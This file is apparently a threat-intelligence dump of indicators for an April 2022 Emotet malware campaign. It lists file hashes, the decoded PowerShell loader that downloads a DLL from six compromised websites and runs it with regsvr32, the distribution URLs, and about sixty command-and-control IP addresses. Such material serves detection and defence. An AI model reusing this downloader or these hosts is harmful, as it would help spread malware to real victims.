@@ -1,0 +1,106 @@
+Emotet 2022 | epoch4 | 26.04.2022 | 
+
+************************************************************************************************************
+
+.xls b1aa55c4df66af4890dd05fbef0907983d80bd3ee891ad7de546a093a1e7fe78
+.dll 786bc22448b4847e784ec3506066701d28f51a5cea7873a89c9306fa7b9b5f68
+.dll b93b8cf9913afec26cbad4c06e1e352e3cd8d5693c7afbda0d99d258bdde26a4
+.dll f1486500fb3e4f217502da8162130552ea9a4edc6ca240d9783ea18559726aa9
+
+************************************************************************************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\10682236691132898, UK.lnk
+
+powershell.exe -command Out-String -InputObject "10682236691132898, UK.lnk                                                                                                               " | Out-Null; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2LyIsImh0dHA6Ly9kZW1vMzQuY2tnLmhrL3NlcnZpY2UvaGhNWnJmQzdNbm05SkQvIiwiaHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8iLCJodHRwOi8vY2lwcm8ubXgvcHJlbnNhL3NpWlA2OXJCRm1pYkR2dVRQMUwvIiwiaHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIvIiwiaHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2IvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0dNT1dEVFJmSUoueHRxO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvR01PV0RUUmZJSi54dHE7YnJlYWt9IGNhdGNoIHsgfX0=')) > "C:\Users\Admin\AppData\Local\Temp\ezMgZunnfF.ps1" ; powershell -executionpolicy bypass -file "C:\Users\Admin\AppData\Local\Temp\ezMgZunnfF.ps1"; Remove-Item "C:\Users\Admin\AppData\Local\Temp\ezMgZunnfF.ps1"
+
+>> decoded >>
+
+$ProgressPreference="SilentlyContinue";$links=("http://focusmedica.in/fmlib/IxBABMh0I2cLM3qq1GVv/","http://demo34.ckg.hk/service/hhMZrfC7Mnm9JD/","http://colegiounamuno.es/cgi-bin/E/","http://cipro.mx/prensa/siZP69rBFmibDvuTP1L/","http://filmmogzivota.rs/SpryAssets/gDR/","https://creemo.pl/wp-admin/ZKS1DcdquUT4Bb8Kb/");foreach ($u in $links) {try {IWR $u -OutFile $env:TEMP/GMOWDTRfIJ.xtq;Regsvr32.exe $env:TEMP/GMOWDTRfIJ.xtq;break} catch { }}
+
+powershell.exe -executionpolicy bypass -file C:\Users\Admin\AppData\Local\Temp\ezMgZunnfF.ps1
+
+regsvr32.exe C:\Users\Admin\AppData\Local\Temp/GMOWDTRfIJ.xtq
+
+regsvr32.exe C:\Windows\system32\Wtqrg\tngkgbvgoc.ahs
+
+************************************************************************************************************
+
+.dll distro
+
+http://focusmedica.in/fmlib/IxBABMh0I2cLM3qq1GVv/
+http://demo34.ckg.hk/service/hhMZrfC7Mnm9JD/
+http://colegiounamuno.es/cgi-bin/E/
+http://cipro.mx/prensa/siZP69rBFmibDvuTP1L/
+http://filmmogzivota.rs/SpryAssets/gDR/
+https://creemo.pl/wp-admin/ZKS1DcdquUT4Bb8Kb/
+
+
+************************************************************************************************************
+
+c2's
+
+138.201.142.73:8080
+138.197.147.101:443
+134.195.212.50:7080
+104.168.154.79:8080
+149.56.131.28:8080
+129.232.188.93:443
+212.24.98.99:8080
+119.193.124.41:7080
+45.118.115.99:8080
+188.44.20.25:443
+103.132.242.26:8080
+201.94.166.162:443
+1.234.21.73:7080
+206.189.28.199:8080
+185.8.212.130:7080
+82.165.152.127:8080
+176.104.106.96:8080
+173.212.193.249:8080
+167.99.115.35:8080
+209.126.98.206:8080
+185.157.82.211:8080
+212.237.17.99:8080
+185.4.135.165:8080
+51.91.7.5:8080
+187.84.80.182:443
+164.68.99.3:8080
+107.182.225.142:8080
+58.227.42.236:80
+103.75.201.2:443
+101.50.0.91:8080
+216.158.226.206:443
+151.106.112.196:8080
+45.235.8.30:8080
+146.59.226.45:443
+45.176.232.124:443
+134.122.66.193:8080
+51.254.140.238:7080
+131.100.24.231:80
+167.172.253.162:8080
+50.30.40.196:8080
+203.114.109.124:443
+94.23.45.86:4143
+189.126.111.200:7080
+160.16.142.56:8080
+27.54.89.58:8080
+5.9.116.246:8080
+46.55.222.11:443
+209.97.163.214:443
+110.232.117.186:8080
+1.234.2.232:8080
+153.126.146.25:7080
+183.111.227.137:8080
+196.218.30.83:443
+103.70.28.102:8080
+51.91.76.89:8080
+91.207.28.33:8080
+72.15.201.15:8080
+103.43.46.182:443
+209.250.246.206:443
+197.242.150.244:8080
+159.65.88.10:8080
+172.104.251.154:8080
+158.69.222.101:443
